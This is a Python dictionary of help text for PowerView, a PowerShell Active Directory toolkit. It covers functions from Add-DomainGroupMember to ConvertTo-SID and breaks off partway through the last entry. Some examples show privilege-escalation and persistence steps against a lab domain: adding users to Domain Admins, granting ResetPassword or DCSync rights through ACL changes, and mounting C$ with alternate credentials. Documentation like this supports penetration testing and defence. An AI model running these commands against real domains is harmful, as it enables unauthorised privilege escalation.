functions = {'Add-DomainGroupMember': '.SYNOPSIS\n'
                          '\n'
                          'Adds a domain user (or group) to an existing domain '
                          'group, assuming\n'
                          'appropriate permissions to do so.\n'
                          '\n'
                          'Author: Will Schroeder (@harmj0y)  \n'
                          'License: BSD 3-Clause  \n'
                          'Required Dependencies: Get-PrincipalContext  \n'
                          '\n'
                          '.DESCRIPTION\n'
                          '\n'
                          'First binds to the specified domain context using '
                          'Get-PrincipalContext.\n'
                          'The bound domain context is then used to search for '
                          'the specified -GroupIdentity,\n'
                          'which returns a '
                          'DirectoryServices.AccountManagement.GroupPrincipal '
                          'object. For\n'
                          'each entry in -Members, each member identity is '
                          'similarly searched for and added\n'
                          'to the group.\n'
                          '\n'
                          '.PARAMETER Identity\n'
                          '\n'
                          'A group SamAccountName (e.g. Group1), '
                          'DistinguishedName (e.g. '
                          'CN=group1,CN=Users,DC=testlab,DC=local),\n'
                          'SID (e.g. '
                          'S-1-5-21-890171859-3433809279-3366196753-1114), or '
                          'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)\n'
                          'specifying the group to add members to.\n'
                          '\n'
                          '.PARAMETER Members\n'
                          '\n'
                          'One or more member identities, i.e. SamAccountName '
                          '(e.g. Group1), DistinguishedName\n'
                          '(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID '
                          '(e.g. '
                          'S-1-5-21-890171859-3433809279-3366196753-1114),\n'
                          'or GUID (e.g. '
                          '4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).\n'
                          '\n'
                          '.PARAMETER Domain\n'
                          '\n'
                          'Specifies the domain to use to search for '
                          'user/group principals, defaults to the current '
                          'domain.\n'
                          '\n'
                          '.PARAMETER Credential\n'
                          '\n'
                          'A [Management.Automation.PSCredential] object of '
                          'alternate credentials\n'
                          'for connection to the target domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          "Add-DomainGroupMember -Identity 'Domain Admins' "
                          "-Members 'harmj0y'\n"
                          '\n'
                          "Adds harmj0y to 'Domain Admins' in the current "
                          'domain.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          "Add-DomainGroupMember -Identity 'Domain Admins' "
                          "-Members 'harmj0y' -Credential $Cred\n"
                          '\n'
                          "Adds harmj0y to 'Domain Admins' in the current "
                          'domain using the alternate credentials.\n'
                          '\n'
                          '.EXAMPLE\n'
                          '\n'
                          '$SecPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          '$Cred = New-Object '
                          "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                          '$SecPassword)\n'
                          '$UserPassword = ConvertTo-SecureString '
                          "'Password123!' -AsPlainText -Force\n"
                          'New-DomainUser -SamAccountName andy '
                          '-AccountPassword $UserPassword -Credential $Cred | '
                          "Add-DomainGroupMember 'Domain Admins' -Credential "
                          '$Cred\n'
                          '\n'
                          "Creates the 'andy' user with the specified "
                          'description and password, using the specified\n'
                          "alternate credentials, and adds the user to 'domain "
                          "admins' using Add-DomainGroupMember\n"
                          'and the alternate credentials.\n'
                          '\n'
                          '.LINK\n'
                          '\n'
                          'http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/\n',
 'Add-DomainObjectAcl': '.SYNOPSIS\n'
                        '\n'
                        'Adds an ACL for a specific active directory object.\n'
                        '\n'
                        'AdminSDHolder ACL approach from Sean Metcalf '
                        '(@pyrotek3): https://adsecurity.org/?p=1906\n'
                        '\n'
                        'Author: Will Schroeder (@harmj0y)  \n'
                        'License: BSD 3-Clause  \n'
                        'Required Dependencies: Get-DomainObject  \n'
                        '\n'
                        '.DESCRIPTION\n'
                        '\n'
                        'This function modifies the ACL/ACE entries for a '
                        'given Active Directory\n'
                        'target object specified by -TargetIdentity. Available '
                        '-Rights are\n'
                        "'All', 'ResetPassword', 'WriteMembers', 'DCSync', or "
                        'a manual extended\n'
                        'rights GUID can be set with -RightsGUID. These rights '
                        'are granted on the target\n'
                        'object for the specified -PrincipalIdentity.\n'
                        '\n'
                        '.PARAMETER TargetIdentity\n'
                        '\n'
                        'A SamAccountName (e.g. harmj0y), DistinguishedName '
                        '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                        'SID (e.g. '
                        'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                        'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                        'for the domain object to modify ACLs for. Required. '
                        'Wildcards accepted.\n'
                        '\n'
                        '.PARAMETER TargetDomain\n'
                        '\n'
                        'Specifies the domain for the TargetIdentity to use '
                        'for the modification, defaults to the current '
                        'domain.\n'
                        '\n'
                        '.PARAMETER TargetLDAPFilter\n'
                        '\n'
                        'Specifies an LDAP query string that is used to filter '
                        'Active Directory object targets.\n'
                        '\n'
                        '.PARAMETER TargetSearchBase\n'
                        '\n'
                        'The LDAP source to search through for targets, e.g. '
                        '"LDAP://OU=secret,DC=testlab,DC=local"\n'
                        'Useful for OU queries.\n'
                        '\n'
                        '.PARAMETER PrincipalIdentity\n'
                        '\n'
                        'A SamAccountName (e.g. harmj0y), DistinguishedName '
                        '(e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),\n'
                        'SID (e.g. '
                        'S-1-5-21-890171859-3433809279-3366196753-1108), or '
                        'GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)\n'
                        'for the domain principal to add for the ACL. '
                        'Required. Wildcards accepted.\n'
                        '\n'
                        '.PARAMETER PrincipalDomain\n'
                        '\n'
                        'Specifies the domain for the TargetIdentity to use '
                        'for the principal, defaults to the current domain.\n'
                        '\n'
                        '.PARAMETER Server\n'
                        '\n'
                        'Specifies an Active Directory server (domain '
                        'controller) to bind to.\n'
                        '\n'
                        '.PARAMETER SearchScope\n'
                        '\n'
                        'Specifies the scope to search under, '
                        'Base/OneLevel/Subtree (default of Subtree).\n'
                        '\n'
                        '.PARAMETER ResultPageSize\n'
                        '\n'
                        'Specifies the PageSize to set for the LDAP searcher '
                        'object.\n'
                        '\n'
                        '.PARAMETER ServerTimeLimit\n'
                        '\n'
                        'Specifies the maximum amount of time the server '
                        'spends searching. Default of 120 seconds.\n'
                        '\n'
                        '.PARAMETER Tombstone\n'
                        '\n'
                        'Switch. Specifies that the searcher should also '
                        'return deleted/tombstoned objects.\n'
                        '\n'
                        '.PARAMETER Credential\n'
                        '\n'
                        'A [Management.Automation.PSCredential] object of '
                        'alternate credentials\n'
                        'for connection to the target domain.\n'
                        '\n'
                        '.PARAMETER Rights\n'
                        '\n'
                        "Rights to add for the principal, 'All', "
                        "'ResetPassword', 'WriteMembers', 'DCSync'.\n"
                        "Defaults to 'All'.\n"
                        '\n'
                        '.PARAMETER RightsGUID\n'
                        '\n'
                        'Manual GUID representing the right to add to the '
                        'target.\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        '$Harmj0ySid = Get-DomainUser harmj0y | Select-Object '
                        '-ExpandProperty objectsid\n'
                        'Get-DomainObjectACL dfm.a -ResolveGUIDs | '
                        'Where-Object {$_.securityidentifier -eq $Harmj0ySid}\n'
                        '\n'
                        '...\n'
                        '\n'
                        'Add-DomainObjectAcl -TargetIdentity dfm.a '
                        '-PrincipalIdentity harmj0y -Rights ResetPassword '
                        '-Verbose\n'
                        'VERBOSE: [Get-DomainSearcher] search string: '
                        'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                        'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                        'string: (&(|(samAccountName=harmj0y)))\n'
                        'VERBOSE: [Get-DomainSearcher] search string: '
                        'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                        'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                        'string:(&(|(samAccountName=dfm.a)))\n'
                        'VERBOSE: [Add-DomainObjectAcl] Granting principal '
                        'CN=harmj0y,CN=Users,DC=testlab,DC=local '
                        "'ResetPassword' on CN=dfm "
                        '(admin),CN=Users,DC=testlab,DC=local\n'
                        'VERBOSE: [Add-DomainObjectAcl] Granting principal '
                        'CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '
                        "'00299570-246d-11d0-a768-00aa006e0529' on CN=dfm "
                        '(admin),CN=Users,DC=testlab,DC=local\n'
                        '\n'
                        'Get-DomainObjectACL dfm.a -ResolveGUIDs | '
                        'Where-Object {$_.securityidentifier -eq $Harmj0ySid '
                        '}\n'
                        '\n'
                        'AceQualifier           : AccessAllowed\n'
                        'ObjectDN               : CN=dfm '
                        '(admin),CN=Users,DC=testlab,DC=local\n'
                        'ActiveDirectoryRights  : ExtendedRight\n'
                        'ObjectAceType          : User-Force-Change-Password\n'
                        'ObjectSID              : '
                        'S-1-5-21-890171859-3433809279-3366196753-1114\n'
                        'InheritanceFlags       : None\n'
                        'BinaryLength           : 56\n'
                        'AceType                : AccessAllowedObject\n'
                        'ObjectAceFlags         : ObjectAceTypePresent\n'
                        'IsCallback             : False\n'
                        'PropagationFlags       : None\n'
                        'SecurityIdentifier     : '
                        'S-1-5-21-890171859-3433809279-3366196753-1108\n'
                        'AccessMask             : 256\n'
                        'AuditFlags             : None\n'
                        'IsInherited            : False\n'
                        'AceFlags               : None\n'
                        'InheritedObjectAceType : All\n'
                        'OpaqueLength           : 0\n'
                        '\n'
                        '.EXAMPLE\n'
                        '\n'
                        '$Harmj0ySid = Get-DomainUser harmj0y | Select-Object '
                        '-ExpandProperty objectsid\n'
                        'Get-DomainObjectACL testuser -ResolveGUIDs | '
                        'Where-Object {$_.securityidentifier -eq $Harmj0ySid}\n'
                        '\n'
                        '[no results returned]\n'
                        '\n'
                        '$SecPassword = ConvertTo-SecureString '
                        "'Password123!'-AsPlainText -Force\n"
                        '$Cred = New-Object '
                        "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                        '$SecPassword)\n'
                        'Add-DomainObjectAcl -TargetIdentity testuser '
                        '-PrincipalIdentity harmj0y -Rights ResetPassword '
                        '-Credential $Cred -Verbose\n'
                        'VERBOSE: [Get-Domain] Using alternate credentials for '
                        'Get-Domain\n'
                        "VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from "
                        '-Credential\n'
                        'VERBOSE: [Get-DomainSearcher] search string: '
                        'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                        'VERBOSE: [Get-DomainSearcher] Using alternate '
                        'credentials for LDAP connection\n'
                        'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                        'string: '
                        '(&(|(|(samAccountName=harmj0y)(name=harmj0y))))\n'
                        'VERBOSE: [Get-Domain] Using alternate credentials for '
                        'Get-Domain\n'
                        "VERBOSE: [Get-Domain] Extracted domain 'TESTLAB' from "
                        '-Credential\n'
                        'VERBOSE: [Get-DomainSearcher] search string: '
                        'LDAP://PRIMARY.testlab.local/DC=testlab,DC=local\n'
                        'VERBOSE: [Get-DomainSearcher] Using alternate '
                        'credentials for LDAP connection\n'
                        'VERBOSE: [Get-DomainObject] Get-DomainObject filter '
                        'string: '
                        '(&(|(|(samAccountName=testuser)(name=testuser))))\n'
                        'VERBOSE: [Add-DomainObjectAcl] Granting principal '
                        'CN=harmj0y,CN=Users,DC=testlab,DC=local '
                        "'ResetPassword' on CN=testuser "
                        'testuser,CN=Users,DC=testlab,DC=local\n'
                        'VERBOSE: [Add-DomainObjectAcl] Granting principal '
                        'CN=harmj0y,CN=Users,DC=testlab,DC=local rights GUID '
                        "'00299570-246d-11d0-a768-00aa006e0529' on "
                        'CN=testuser,CN=Users,DC=testlab,DC=local\n'
                        '\n'
                        'Get-DomainObjectACL testuser -ResolveGUIDs | '
                        'Where-Object {$_.securityidentifier -eq $Harmj0ySid '
                        '}\n'
                        '\n'
                        'AceQualifier           : AccessAllowed\n'
                        'ObjectDN               : CN=dfm '
                        '(admin),CN=Users,DC=testlab,DC=local\n'
                        'ActiveDirectoryRights  : ExtendedRight\n'
                        'ObjectAceType          : User-Force-Change-Password\n'
                        'ObjectSID              : '
                        'S-1-5-21-890171859-3433809279-3366196753-1114\n'
                        'InheritanceFlags       : None\n'
                        'BinaryLength           : 56\n'
                        'AceType                : AccessAllowedObject\n'
                        'ObjectAceFlags         : ObjectAceTypePresent\n'
                        'IsCallback             : False\n'
                        'PropagationFlags       : None\n'
                        'SecurityIdentifier     : '
                        'S-1-5-21-890171859-3433809279-3366196753-1108\n'
                        'AccessMask             : 256\n'
                        'AuditFlags             : None\n'
                        'IsInherited            : False\n'
                        'AceFlags               : None\n'
                        'InheritedObjectAceType : All\n'
                        'OpaqueLength           : 0\n'
                        '\n'
                        '.LINK\n'
                        '\n'
                        'https://adsecurity.org/?p=1906\n'
                        'https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell\n',
 'Add-RemoteConnection': '.SYNOPSIS\n'
                         '\n'
                         'Pseudo "mounts" a connection to a remote path using '
                         'the specified\n'
                         'credential object, allowing for access of remote '
                         "resources. If a -Path isn't\n"
                         'specified, a -ComputerName is required to '
                         'pseudo-mount IPC$.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: PSReflect  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'This function uses WNetAddConnection2W to make a '
                         "'temporary' (i.e. not saved) connection\n"
                         'to the specified remote -Path (\\\\UNC\\share) with '
                         'the alternate credentials specified in the\n'
                         "-Credential object. If a -Path isn't specified, a "
                         '-ComputerName is required to pseudo-mount IPC$.\n'
                         '\n'
                         'To destroy the connection, use '
                         'Remove-RemoteConnection with the same specified '
                         '\\\\UNC\\share path\n'
                         'or -ComputerName.\n'
                         '\n'
                         '.PARAMETER ComputerName\n'
                         '\n'
                         'Specifies the system to add a \\\\ComputerName\\IPC$ '
                         'connection for.\n'
                         '\n'
                         '.PARAMETER Path\n'
                         '\n'
                         'Specifies the remote \\\\UNC\\path to add the '
                         'connection for.\n'
                         '\n'
                         '.PARAMETER Credential\n'
                         '\n'
                         'A [Management.Automation.PSCredential] object of '
                         'alternate credentials\n'
                         'for connection to the remote system.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         '$Cred = Get-Credential\n'
                         'Add-RemoteConnection -ComputerName '
                         "'PRIMARY.testlab.local' -Credential $Cred\n"
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         "$SecPassword = ConvertTo-SecureString 'Password123!' "
                         '-AsPlainText -Force\n'
                         '$Cred = New-Object '
                         "System.Management.Automation.PSCredential('TESTLAB\\dfm.a', "
                         '$SecPassword)\n'
                         'Add-RemoteConnection -Path '
                         "'\\\\PRIMARY.testlab.local\\C$\\' -Credential $Cred\n"
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         '$Cred = Get-Credential\n'
                         "@('PRIMARY.testlab.local','SECONDARY.testlab.local') "
                         '| Add-RemoteConnection  -Credential $Cred\n',
 'Convert-ADName': '.SYNOPSIS\n'
                   '\n'
                   'Converts Active Directory object names between a variety '
                   'of formats.\n'
                   '\n'
                   'Author: Bill Stewart, Pasquale Lantella  \n'
                   'Modifications: Will Schroeder (@harmj0y)  \n'
                   'License: BSD 3-Clause  \n'
                   'Required Dependencies: None  \n'
                   '\n'
                   '.DESCRIPTION\n'
                   '\n'
                   "This function is heavily based on Bill Stewart's code and "
                   "Pasquale Lantella's code (in LINK)\n"
                   'and translates Active Directory names between various '
                   'formats using the NameTranslate COM object.\n'
                   '\n'
                   '.PARAMETER Identity\n'
                   '\n'
                   'Specifies the Active Directory object name to translate, '
                   'of the following form:\n'
                   '\n'
                   "    DN                short for 'distinguished name'; "
                   "e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'\n"
                   '    Canonical         canonical name; e.g., '
                   "'fabrikam.com/Engineers/Phineas Flynn'\n"
                   '    NT4               domain\\username; e.g., '
                   "'fabrikam\\pflynn'\n"
                   "    Display           display name, e.g. 'pflynn'\n"
                   '    DomainSimple      simple domain name format, e.g. '
                   "'pflynn@fabrikam.com'\n"
                   '    EnterpriseSimple  simple enterprise name format, e.g. '
                   "'pflynn@fabrikam.com'\n"
                   '    GUID              GUID; e.g., '
                   "'{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'\n"
                   '    UPN               user principal name; e.g., '
                   "'pflynn@fabrikam.com'\n"
                   '    CanonicalEx       extended canonical name format\n'
                   '    SPN               service principal name format; e.g. '
                   "'HTTP/kairomac.contoso.com'\n"
                   '    SID               Security Identifier; e.g., '
                   "'S-1-5-21-12986231-600641547-709122288-57999'\n"
                   '\n'
                   '.PARAMETER OutputType\n'
                   '\n'
                   'Specifies the output name type you want to convert to, '
                   'which must be one of the following:\n'
                   '\n'
                   "    DN                short for 'distinguished name'; "
                   "e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'\n"
                   '    Canonical         canonical name; e.g., '
                   "'fabrikam.com/Engineers/Phineas Flynn'\n"
                   '    NT4               domain\\username; e.g., '
                   "'fabrikam\\pflynn'\n"
                   "    Display           display name, e.g. 'pflynn'\n"
                   '    DomainSimple      simple domain name format, e.g. '
                   "'pflynn@fabrikam.com'\n"
                   '    EnterpriseSimple  simple enterprise name format, e.g. '
                   "'pflynn@fabrikam.com'\n"
                   '    GUID              GUID; e.g., '
                   "'{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'\n"
                   '    UPN               user principal name; e.g., '
                   "'pflynn@fabrikam.com'\n"
                   '    CanonicalEx       extended canonical name format, e.g. '
                   "'fabrikam.com/Users/Phineas Flynn'\n"
                   '    SPN               service principal name format; e.g. '
                   "'HTTP/kairomac.contoso.com'\n"
                   '\n'
                   '.PARAMETER Domain\n'
                   '\n'
                   'Specifies the domain to use for the translation, defaults '
                   'to the current domain.\n'
                   '\n'
                   '.PARAMETER Server\n'
                   '\n'
                   'Specifies an Active Directory server (domain controller) '
                   'to bind to for the translation.\n'
                   '\n'
                   '.PARAMETER Credential\n'
                   '\n'
                   'Specifies an alternate credential to use for the '
                   'translation.\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   'Convert-ADName -Identity "TESTLAB\\harmj0y"\n'
                   '\n'
                   'harmj0y@testlab.local\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   '"TESTLAB\\krbtgt", '
                   '"CN=Administrator,CN=Users,DC=testlab,DC=local" | '
                   'Convert-ADName -OutputType Canonical\n'
                   '\n'
                   'testlab.local/Users/krbtgt\n'
                   'testlab.local/Users/Administrator\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "Convert-ADName -OutputType dn -Identity 'TESTLAB\\harmj0y' "
                   '-Server PRIMARY.testlab.local\n'
                   '\n'
                   'CN=harmj0y,CN=Users,DC=testlab,DC=local\n'
                   '\n'
                   '.EXAMPLE\n'
                   '\n'
                   "$SecPassword = ConvertTo-SecureString 'Password123!' "
                   '-AsPlainText -Force\n'
                   '$Cred = New-Object '
                   "System.Management.Automation.PSCredential('TESTLAB\\dfm', "
                   '$SecPassword)\n'
                   "'S-1-5-21-890171859-3433809279-3366196753-1108' | "
                   'Convert-ADNAme -Credential $Cred\n'
                   '\n'
                   'TESTLAB\\harmj0y\n'
                   '\n'
                   '.INPUTS\n'
                   '\n'
                   'String\n'
                   '\n'
                   'Accepts one or more objects name strings on the pipeline.\n'
                   '\n'
                   '.OUTPUTS\n'
                   '\n'
                   'String\n'
                   '\n'
                   'Outputs a string representing the converted name.\n'
                   '\n'
                   '.LINK\n'
                   '\n'
                   'http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats\n'
                   'https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67\n',
 'Convert-DNSRecord': '.SYNOPSIS\n'
                      '\n'
                      'Helpers that decodes a binary DNS record blob.\n'
                      '\n'
                      'Author: Michael B. Smith, Will Schroeder (@harmj0y)  \n'
                      'License: BSD 3-Clause  \n'
                      'Required Dependencies: None  \n'
                      '\n'
                      '.DESCRIPTION\n'
                      '\n'
                      'Decodes a binary blob representing an Active Directory '
                      'DNS entry.\n'
                      'Used by Get-DomainDNSRecord.\n'
                      '\n'
                      "Adapted/ported from Michael B. Smith's code at "
                      'https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1\n'
                      '\n'
                      '.PARAMETER DNSRecord\n'
                      '\n'
                      'A byte array representing the DNS record.\n'
                      '\n'
                      '.OUTPUTS\n'
                      '\n'
                      'System.Management.Automation.PSCustomObject\n'
                      '\n'
                      'Outputs custom PSObjects with detailed information '
                      'about the DNS record entry.\n'
                      '\n'
                      '.LINK\n'
                      '\n'
                      'https://raw.githubusercontent.com/mmessano/PowerShell/master/dns-dump.ps1\n',
 'Convert-LDAPProperty': '.SYNOPSIS\n'
                         '\n'
                         'Helper that converts specific LDAP property result '
                         'fields and outputs\n'
                         'a custom psobject.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: None  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'Converts a set of raw LDAP properties results from '
                         'ADSI/LDAP searches\n'
                         'into a proper PSObject. Used by several of the '
                         'Get-Domain* function.\n'
                         '\n'
                         '.PARAMETER Properties\n'
                         '\n'
                         'Properties object to extract out LDAP fields for '
                         'display.\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'System.Management.Automation.PSCustomObject\n'
                         '\n'
                         'A custom PSObject with LDAP hashtable properties '
                         'translated.\n',
 'ConvertFrom-LDAPLogonHours': '.SYNOPSIS\n'
                               '\n'
                               'Converts the LDAP LogonHours array to a '
                               'processible object.\n'
                               '\n'
                               'Author: Lee Christensen (@tifkin_)  \n'
                               'License: BSD 3-Clause  \n'
                               'Required Dependencies: None\n'
                               '\n'
                               '.DESCRIPTION\n'
                               '\n'
                               'Converts the LDAP LogonHours array to a '
                               'processible object.  Each entry\n'
                               'property in the output object corresponds to a '
                               'day of the week and hour during\n'
                               'the day (in UTC) indicating whether or not the '
                               'user can logon at the specified\n'
                               'hour.\n'
                               '\n'
                               '.PARAMETER LogonHoursArray\n'
                               '\n'
                               '21-byte LDAP hours array.\n'
                               '\n'
                               '.EXAMPLE\n'
                               '\n'
                               '$hours = (Get-DomainUser -LDAPFilter '
                               "'userworkstations=*')[0].logonhours\n"
                               'ConvertFrom-LDAPLogonHours $hours\n'
                               '\n'
                               'Gets the logonhours array from the first AD '
                               'user with logon restrictions.\n'
                               '\n'
                               '.OUTPUTS\n'
                               '\n'
                               'PowerView.LogonHours\n',
 'ConvertFrom-SID': '.SYNOPSIS\n'
                    '\n'
                    'Converts a security identifier (SID) to a group/user '
                    'name.\n'
                    '\n'
                    'Author: Will Schroeder (@harmj0y)  \n'
                    'License: BSD 3-Clause  \n'
                    'Required Dependencies: Convert-ADName  \n'
                    '\n'
                    '.DESCRIPTION\n'
                    '\n'
                    'Converts a security identifier string (SID) to a '
                    'group/user name\n'
                    'using Convert-ADName.\n'
                    '\n'
                    '.PARAMETER ObjectSid\n'
                    '\n'
                    'Specifies one or more SIDs to convert.\n'
                    '\n'
                    '.PARAMETER Domain\n'
                    '\n'
                    'Specifies the domain to use for the translation, defaults '
                    'to the current domain.\n'
                    '\n'
                    '.PARAMETER Server\n'
                    '\n'
                    'Specifies an Active Directory server (domain controller) '
                    'to bind to for the translation.\n'
                    '\n'
                    '.PARAMETER Credential\n'
                    '\n'
                    'Specifies an alternate credential to use for the '
                    'translation.\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    'ConvertFrom-SID '
                    'S-1-5-21-890171859-3433809279-3366196753-1108\n'
                    '\n'
                    'TESTLAB\\harmj0y\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    '"S-1-5-21-890171859-3433809279-3366196753-1107", '
                    '"S-1-5-21-890171859-3433809279-3366196753-1108", '
                    '"S-1-5-32-562" | ConvertFrom-SID\n'
                    '\n'
                    'TESTLAB\\WINDOWS2$\n'
                    'TESTLAB\\harmj0y\n'
                    'BUILTIN\\Distributed COM Users\n'
                    '\n'
                    '.EXAMPLE\n'
                    '\n'
                    "$SecPassword = ConvertTo-SecureString 'Password123!' "
                    '-AsPlainText -Force\n'
                    '$Cred = New-Object '
                    "System.Management.Automation.PSCredential('TESTLAB\\dfm', "
                    '$SecPassword)\n'
                    'ConvertFrom-SID '
                    'S-1-5-21-890171859-3433809279-3366196753-1108 -Credential '
                    '$Cred\n'
                    '\n'
                    'TESTLAB\\harmj0y\n'
                    '\n'
                    '.INPUTS\n'
                    '\n'
                    'String\n'
                    '\n'
                    'Accepts one or more SID strings on the pipeline.\n'
                    '\n'
                    '.OUTPUTS\n'
                    '\n'
                    'String\n'
                    '\n'
                    'The converted DOMAIN\\username.\n',
 'ConvertFrom-UACValue': '.SYNOPSIS\n'
                         '\n'
                         'Converts a UAC int value to human readable form.\n'
                         '\n'
                         'Author: Will Schroeder (@harmj0y)  \n'
                         'License: BSD 3-Clause  \n'
                         'Required Dependencies: None  \n'
                         '\n'
                         '.DESCRIPTION\n'
                         '\n'
                         'This function will take an integer that represents a '
                         'User Account\n'
                         'Control (UAC) binary blob and will covert it to an '
                         'ordered\n'
                         'dictionary with each bitwise value broken out. By '
                         'default only values\n'
                         'set are displayed- the -ShowAll switch will display '
                         'all values with\n'
                         'a + next to the ones set.\n'
                         '\n'
                         '.PARAMETER Value\n'
                         '\n'
                         'Specifies the integer UAC value to convert.\n'
                         '\n'
                         '.PARAMETER ShowAll\n'
                         '\n'
                         'Switch. Signals ConvertFrom-UACValue to display all '
                         'UAC values, with a + indicating the value is '
                         'currently set.\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'ConvertFrom-UACValue -Value 66176\n'
                         '\n'
                         'Name                           Value\n'
                         '----                           -----\n'
                         'ENCRYPTED_TEXT_PWD_ALLOWED     128\n'
                         'NORMAL_ACCOUNT                 512\n'
                         'DONT_EXPIRE_PASSWORD           65536\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainUser harmj0y | ConvertFrom-UACValue\n'
                         '\n'
                         'Name                           Value\n'
                         '----                           -----\n'
                         'NORMAL_ACCOUNT                 512\n'
                         'DONT_EXPIRE_PASSWORD           65536\n'
                         '\n'
                         '.EXAMPLE\n'
                         '\n'
                         'Get-DomainUser harmj0y | ConvertFrom-UACValue '
                         '-ShowAll\n'
                         '\n'
                         'Name                           Value\n'
                         '----                           -----\n'
                         'SCRIPT                         1\n'
                         'ACCOUNTDISABLE                 2\n'
                         'HOMEDIR_REQUIRED               8\n'
                         'LOCKOUT                        16\n'
                         'PASSWD_NOTREQD                 32\n'
                         'PASSWD_CANT_CHANGE             64\n'
                         'ENCRYPTED_TEXT_PWD_ALLOWED     128\n'
                         'TEMP_DUPLICATE_ACCOUNT         256\n'
                         'NORMAL_ACCOUNT                 512+\n'
                         'INTERDOMAIN_TRUST_ACCOUNT      2048\n'
                         'WORKSTATION_TRUST_ACCOUNT      4096\n'
                         'SERVER_TRUST_ACCOUNT           8192\n'
                         'DONT_EXPIRE_PASSWORD           65536+\n'
                         'MNS_LOGON_ACCOUNT              131072\n'
                         'SMARTCARD_REQUIRED             262144\n'
                         'TRUSTED_FOR_DELEGATION         524288\n'
                         'NOT_DELEGATED                  1048576\n'
                         'USE_DES_KEY_ONLY               2097152\n'
                         'DONT_REQ_PREAUTH               4194304\n'
                         'PASSWORD_EXPIRED               8388608\n'
                         'TRUSTED_TO_AUTH_FOR_DELEGATION 16777216\n'
                         'PARTIAL_SECRETS_ACCOUNT        67108864\n'
                         '\n'
                         '.INPUTS\n'
                         '\n'
                         'Int\n'
                         '\n'
                         'Accepts an integer representing a UAC binary blob.\n'
                         '\n'
                         '.OUTPUTS\n'
                         '\n'
                         'System.Collections.Specialized.OrderedDictionary\n'
                         '\n'
                         'An ordered dictionary with the converted UAC '
                         'fields.\n'
                         '\n'
                         '.LINK\n'
                         '\n'
                         'https://support.microsoft.com/en-us/kb/305144\n',
 'ConvertTo-SID': '.SYNOPSIS\n'
                  '\n'
                  'Converts a given user/group name to a security identifier '
                  '(SID).\n'
                  '\n'
                  'Author: Will Schroeder (@harmj0y)  \n'
                  'License: BSD 3-Clause  \n'
                  'Required Dependencies: Convert-ADName, Get-DomainObject, '
                  'Get-Domain  \n'
                  '\n'
                  '.DESCRIPTION\n'
                  '\n'
                  'Converts a "DOMAIN\\username" syntax to a security '
                  'identifier (SID)\n'
                  "using System.Security.Principal.NTAccount's translate "
                  'function. If alternate\n'
                  'credentials are supplied, then Get-ADObject is used to try '
                  'to map the name\n'
                  'to a security identifier.\n'
                  '\n'
                  '.PARAMETER ObjectName\n'
                  '\n'
                  "The user/group name to convert, can be 'user' or "
                  "'DOMAIN\\user' format.\n"
                  '\n'
                  '.PARAMETER Domain\n'
                  '\n'
                  'Specifies the domain to use for the translation, defaults '
                  'to the current domain.\n'
                  '\n'
                  '.PARAMETER Server\n'
                  '\n'
                  'Specifies an Active Directory server (domain controller) to '
                  'bind to for the translation.\n'
                  '\n'
                  '.PARAMETER Credential\n'
                  '\n'
                  'Specifies an alternate credential to use for the '
                  'translation.\n'
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  "ConvertTo-SID 'DEV\\dfm'\n"
                  '\n'
                  '.EXAMPLE\n'
                  '\n'
                  "'DEV\\dfm','DEV\\krbtgt' | ConvertTo-SID\n"
                  '\n'
